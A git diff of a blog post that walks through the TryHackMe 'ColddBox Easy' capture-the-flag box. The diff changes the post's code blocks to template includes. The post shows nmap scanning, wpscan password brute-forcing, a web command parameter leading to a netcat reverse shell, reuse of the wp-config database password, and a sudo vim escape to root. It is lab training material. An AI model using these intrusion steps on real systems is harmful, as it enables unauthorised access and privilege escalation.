@@ -26,8 +26,7 @@ Here we are going to break the ice with this Colddbox.
 
 Run nmap to get a list of the services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.242.148
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:04 AEDT
@@ -53,14 +52,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap's vuln category scripts.  Notice the hidden directory.
 
-{% raw %}
-```bash
+{% capture culnchk %}
 ┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
 └─$ sudo nmap --script vuln -oN vulnchk 10.10.242.148
 [sudo] password for kali: 
@@ -86,8 +84,8 @@ PORT   STATE SERVICE
 |_  /hidden/: Potentially interesting folder
 
 Nmap done: 1 IP address (1 host up) scanned in 329.23 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=culnchk %}
 
 <br />
 Check the Wordpress post and comment.
@@ -110,21 +108,25 @@ Check the hidden directory.
 <br />
 Create a file that has the three names from hidden to a text file.
 
-{% raw %}
-```bash
+{% capture catuserstxt %}
 ┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
-└─$ cat users.txt  
+└─$ cat users.txt 
+{% endcapture %}
+
+{% capture userstxt %}
 c0ldd
 hugo
 philip
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catuserstxt %}
+
+{% include codebox.html title="Config File Example" content=userstxt %}
 
 <br />
 Run wpscan to try and brute-force the user passwords.
 
-{% raw %}
-```bash
+{% capture wpscanbrute %}
 ┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
 └─$ wpscan --url http://10.10.242.148 --passwords /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 
 _______________________________________________________________
@@ -181,8 +183,8 @@ _______________________________________________________________
 [+] Elapsed time: 00:28:19
 
 Scan Aborted: Canceled by User
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=wpscanbrute %}
 
 <br />
 Test the credentials and login.
@@ -223,14 +225,13 @@ Navigate to the 404.php page and use id in the cmd parameter to test the command
 <br />
 Set up a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
 └─$ sudo nc -nlvp 443                      
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use revshells to get a one-liner payload.
@@ -254,8 +255,7 @@ Use the payload in the cmd parameter.
 <br />
 Check the wp-config.php file to get the database creds.
 
-{% raw %}
-```php
+{% capture wpconfigphp %}
 <?php
 /**
  * The base configurations of the WordPress.
@@ -284,28 +284,26 @@ define('DB_USER', 'c0ldd');
 /** MySQL database password */
 define('DB_PASSWORD', 'cybersecurity');
 
-<snip
-```
-{% endraw %}
+<snip>
+{% endcapture %}
+{% include terminal.html language='php' title='wp-config.php' content=wpconfigphp %}
 
 <br />
 Use the password from the config file to su into the c0ldd account.
 
-{% raw %}
-```bash
+{% capture sucold %}
 www-data@ColddBox-Easy:/var/www/html$ su c0ldd
 su c0ldd
 Password: cybersecurity
 
 c0ldd@ColddBox-Easy:/var/www/html$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sucold %}
 
 <br />
 Get the user flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 c0ldd@ColddBox-Easy:~$ cat user.txt
 cat user.txt
 <redacted>
@@ -323,14 +321,13 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::d6:c4ff:fe68:4dc7/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run the sudo -l to get a list of commands that you can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 c0ldd@ColddBox-Easy:~$ sudo -l
 sudo -l
 [sudo] password for c0ldd: cybersecurity
@@ -343,14 +340,13 @@ El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
     (root) /usr/bin/vim
     (root) /bin/chmod
     (root) /usr/bin/ftp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Run sudo /usr/bin/vim to enter vim.  Once in vim, drop into a shell.
 
-{% raw %}
-```bash
+{% capture gtfovim %}
 :!sh
 ~
 ~
@@ -375,14 +371,13 @@ Run sudo /usr/bin/vim to enter vim.  Once in vim, drop into a shell.
 ~
 ~
 :!sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=gtfovim %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # whoami
 whoami
 root
@@ -403,8 +398,8 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::d6:c4ff:fe68:4dc7/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, looks like we put c0lddbox on ice!  See you in the next one.
